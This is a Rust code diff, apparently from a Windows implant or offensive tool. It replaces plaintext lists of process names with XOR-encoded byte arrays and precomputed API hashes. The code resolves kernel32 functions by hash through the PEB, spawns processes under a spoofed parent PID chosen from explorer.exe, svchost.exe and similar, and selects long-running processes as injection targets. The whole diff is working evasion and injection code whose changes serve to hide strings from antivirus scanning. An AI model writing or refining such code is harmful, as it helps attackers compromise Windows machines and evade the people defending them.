@@ -17,9 +17,9 @@ use windows_sys::Win32::System::Threading::{
 /// Resolve CreateProcessA and PROC_THREAD_ATTRIBUTE helpers from kernel32 by hash (x64 only).
 #[cfg(all(target_os = "windows", target_arch = "x86_64"))]
 unsafe fn k32_proc_fns() -> Option<(usize, usize, usize, usize)> {
-    use crate::resolve::api_hash::{djb2_hash_lower, peb_get_module_base, resolve_by_hash};
+    use crate::resolve::api_hash::{peb_get_module_base, resolve_by_hash};
     use crate::resolve::api_hash::h;
-    let k32 = peb_get_module_base(djb2_hash_lower(b"kernel32.dll"));
+    let k32 = peb_get_module_base(h::DLL_K32);
     if k32.is_null() { return None; }
     let init = resolve_by_hash(k32, h::K32_INIT_PTA)? as usize;
     let upd  = resolve_by_hash(k32, h::K32_UPD_PTA)? as usize;
@@ -128,24 +128,38 @@ pub unsafe fn spawn_with_ppid(target_exe: &[u8], parent_name: &[u8]) -> Option<(
 
 #[cfg(target_os = "windows")]
 pub unsafe fn spawn_with_safe_ppid(target_exe: &[u8]) -> Option<(isize, isize)> {
-    let candidates: &[&[u8]] = &[
-        b"explorer.exe\0",
-        b"RuntimeBroker.exe\0",
-        b"sihost.exe\0",
-        b"svchost.exe\0",
-        b"SearchIndexer.exe\0",
-    ];
-    for &name in candidates {
-        if let Some(result) = spawn_with_ppid(target_exe, name) {
-            return Some(result);
-        }
+    const K: u8 = 0x07;
+    {
+        let enc: [u8; 13] = [0x62,0x7F,0x77,0x6B,0x68,0x75,0x62,0x75,0x29,0x62,0x7F,0x62,0x07];
+        let mut d = enc; for b in d.iter_mut() { *b ^= K; }
+        if let Some(r) = spawn_with_ppid(target_exe, &d) { return Some(r); }
+    }
+    {
+        let enc: [u8; 18] = [0x55,0x72,0x69,0x73,0x6e,0x6a,0x62,0x45,0x75,0x68,0x6c,0x62,0x75,0x29,0x62,0x7f,0x62,0x07];
+        let mut d = enc; for b in d.iter_mut() { *b ^= K; }
+        if let Some(r) = spawn_with_ppid(target_exe, &d) { return Some(r); }
+    }
+    {
+        let enc: [u8; 11] = [0x74,0x6E,0x6F,0x68,0x74,0x73,0x29,0x62,0x7F,0x62,0x07];
+        let mut d = enc; for b in d.iter_mut() { *b ^= K; }
+        if let Some(r) = spawn_with_ppid(target_exe, &d) { return Some(r); }
+    }
+    {
+        let enc: [u8; 12] = [0x74,0x71,0x64,0x6F,0x68,0x74,0x73,0x29,0x62,0x7F,0x62,0x07];
+        let mut d = enc; for b in d.iter_mut() { *b ^= K; }
+        if let Some(r) = spawn_with_ppid(target_exe, &d) { return Some(r); }
+    }
+    {
+        let enc: [u8; 18] = [0x54,0x62,0x66,0x75,0x64,0x6f,0x4e,0x69,0x63,0x62,0x7f,0x62,0x75,0x29,0x62,0x7f,0x62,0x07];
+        let mut d = enc; for b in d.iter_mut() { *b ^= K; }
+        if let Some(r) = spawn_with_ppid(target_exe, &d) { return Some(r); }
     }
     // Fallback plain CreateProcessA — still hash-resolved on x64
     #[cfg(target_arch = "x86_64")]
     let cpa_plain: unsafe extern "system" fn(*const u8, *mut u8, *const core::ffi::c_void, *const core::ffi::c_void, i32, u32, *const core::ffi::c_void, *const u8, *const STARTUPINFOA, *mut PROCESS_INFORMATION) -> i32 = {
-        use crate::resolve::api_hash::{djb2_hash_lower, peb_get_module_base, resolve_by_hash};
+        use crate::resolve::api_hash::{peb_get_module_base, resolve_by_hash};
         use crate::resolve::api_hash::h;
-        let k32 = peb_get_module_base(djb2_hash_lower(b"kernel32.dll"));
+        let k32 = peb_get_module_base(h::DLL_K32);
         match resolve_by_hash(k32, h::K32_CREATE_PA) {
             Some(p) => core::mem::transmute(p),
             None    => return None,
@@ -171,17 +185,31 @@ pub unsafe fn spawn_with_safe_ppid(target_exe: &[u8]) -> Option<(isize, isize)> 
 /// Find a suitable injection target from a priority list of common user-space processes.
 /// Prefers long-running, non-critical processes that won't be killed during an operation.
 pub unsafe fn find_injection_target() -> Option<u32> {
-    const TARGETS: &[&[u8]] = &[
-        b"explorer.exe\0",
-        b"OneDrive.exe\0",
-        b"RuntimeBroker.exe\0",
-        b"sihost.exe\0",
-        b"SearchApp.exe\0",
-    ];
-    for &name in TARGETS {
-        if let Some(pid) = find_pid_by_name(name) {
-            return Some(pid);
-        }
+    const K: u8 = 0x07;
+    {
+        let enc: [u8; 13] = [0x62,0x7F,0x77,0x6B,0x68,0x75,0x62,0x75,0x29,0x62,0x7F,0x62,0x07];
+        let mut d = enc; for b in d.iter_mut() { *b ^= K; }
+        if let Some(pid) = find_pid_by_name(&d) { return Some(pid); }
+    }
+    {
+        let enc: [u8; 13] = [0x48,0x69,0x62,0x43,0x75,0x6e,0x71,0x62,0x29,0x62,0x7f,0x62,0x07];
+        let mut d = enc; for b in d.iter_mut() { *b ^= K; }
+        if let Some(pid) = find_pid_by_name(&d) { return Some(pid); }
+    }
+    {
+        let enc: [u8; 18] = [0x55,0x72,0x69,0x73,0x6e,0x6a,0x62,0x45,0x75,0x68,0x6c,0x62,0x75,0x29,0x62,0x7f,0x62,0x07];
+        let mut d = enc; for b in d.iter_mut() { *b ^= K; }
+        if let Some(pid) = find_pid_by_name(&d) { return Some(pid); }
+    }
+    {
+        let enc: [u8; 11] = [0x74,0x6E,0x6F,0x68,0x74,0x73,0x29,0x62,0x7F,0x62,0x07];
+        let mut d = enc; for b in d.iter_mut() { *b ^= K; }
+        if let Some(pid) = find_pid_by_name(&d) { return Some(pid); }
+    }
+    {
+        let enc: [u8; 14] = [0x54,0x62,0x66,0x75,0x64,0x6f,0x46,0x77,0x77,0x29,0x62,0x7f,0x62,0x07];
+        let mut d = enc; for b in d.iter_mut() { *b ^= K; }
+        if let Some(pid) = find_pid_by_name(&d) { return Some(pid); }
     }
     None
 }
